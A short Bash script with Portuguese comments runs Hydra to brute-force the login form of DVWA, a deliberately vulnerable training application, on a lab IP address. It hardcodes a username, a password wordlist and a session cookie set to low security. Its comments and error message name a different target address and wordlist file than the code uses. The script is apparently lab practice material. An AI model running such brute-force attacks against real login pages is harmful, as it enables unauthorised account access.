#!/usr/bin/env bash
# hydra_web.sh
# Força bruta em formulário web com Hydra — ambiente de laboratório.
#
# Uso:
#   chmod +x hydra_web.sh
#   ./hydra_web.sh
#
# Comando usado:
#   hydra -l admin -P pass.txt 127.0.0.1 http-get-form
#     "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:
#       H='Cookie: PHPSESSID=4dfcf97e34b40ac3cb9fe2c9023cd774;security=low':
#       F=Username and/or password incorrect."

set -euo pipefail

TARGET="192.168.56.103"
USERNAME="admin"
PASSWORDS="wordlists/senham.txt"

echo "=== Força Bruta Web (Hydra) ==="
echo "Target: $TARGET | Usuário: $USERNAME | Senhas: $PASSWORDS"

if [ ! -f "$PASSWORDS" ]; then
  echo "ERRO: pass.txt não encontrado"
  exit 1
fi

# Comando executado:
#   hydra -l admin -P pass.txt 127.0.0.1 http-get-form
#     "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:
#       H='Cookie: PHPSESSID=4dfcf97e34b40ac3cb9fe2c9023cd774;security=low':
#       F=Username and/or password incorrect."
echo "Executando Hydra..."
hydra -l "$USERNAME" -P "$PASSWORDS" "$TARGET" http-get-form \
  "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H='Cookie: PHPSESSID=4dfcf97e34b40ac3cb9fe2c9023cd774;security=low':F=Username and/or password incorrect."

echo ""
echo "=== Finalização ==="
